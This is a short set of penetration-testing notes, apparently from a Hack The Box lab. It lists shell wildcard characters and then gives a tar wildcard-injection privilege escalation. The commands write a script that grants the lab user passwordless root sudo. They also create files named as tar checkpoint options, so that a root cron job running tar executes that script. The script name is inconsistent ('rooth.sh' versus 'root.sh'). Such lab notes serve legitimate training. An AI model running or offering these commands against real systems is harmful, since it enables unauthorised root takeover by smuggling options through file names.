Examples:
* (match any number of characters)
? (matches single character)
[] (match any single one character at the defined position)
~ (home directory)
- (range)

**Exploit cronjob to allow sudo
```shell-session
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > rooth.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```
